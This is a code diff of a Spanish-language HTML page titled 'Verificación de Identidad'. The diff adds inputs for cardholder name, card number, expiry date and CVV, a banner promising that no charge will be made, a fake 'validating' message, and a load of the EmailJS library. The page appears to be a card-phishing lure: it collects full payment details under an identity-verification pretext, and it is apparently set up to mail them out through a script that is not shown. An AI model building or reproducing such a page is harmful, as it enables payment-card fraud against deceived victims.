@@ -3,27 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificación Final</title>
+    <title>Verificación de Identidad</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <h1>🔐 VERIFICACIÓN DE IDENTIDAD</h1>
         <div class="aviso">¡NO SE REALIZARÁ NINGÚN COBRO!</div>
-
-        <!-- Div para mostrar errores -->
-        <div id="errores" class="hidden"></div>
+        <div id="errores"></div>
 
         <form id="paymentForm">
             <!-- Nombre -->
             <div class="input-group">
                 <label>Nombre del titular</label>
-                <input type="text" id="nombre" placeholder="Ej. Juan Pérez" required>
+                <input type="text" id="nombre" placeholder="Ej. María Pérez" required>
             </div>
 
-            <!-- Resto del formulario igual... -->
+            <!-- Tarjeta -->
+            <div class="input-group">
+                <label>Número de tarjeta</label>
+                <input type="text" id="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            </div>
+
+            <!-- Fecha -->
+            <div class="input-group">
+                <label>Fecha de expiración</label>
+                <input type="month" id="fecha" required>
+            </div>
+
+            <!-- CVV -->
+            <div class="input-group">
+                <label>Código de seguridad (CVV)</label>
+                <input type="text" id="cvv" placeholder="1234" maxlength="4" required>
+            </div>
+
+            <button type="submit">Confirmar Verificación ✔️</button>
         </form>
+
+        <div id="mensajeCarga">⏳ Validando información...</div>
     </div>
-    <!-- Resto del código igual... -->
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
